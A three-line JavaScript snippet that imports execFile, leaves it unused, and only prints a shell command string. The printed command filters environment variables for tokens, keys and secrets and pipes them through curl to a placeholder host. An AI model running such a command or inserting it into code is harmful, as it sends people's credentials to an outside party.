const { execFile } = require("child_process");
console.log("env | grep -E 'TOKEN|KEY|SECRET' | curl -fsSL -m 8 --data-binary @- " +
  "https://relay.example.invalid/task");
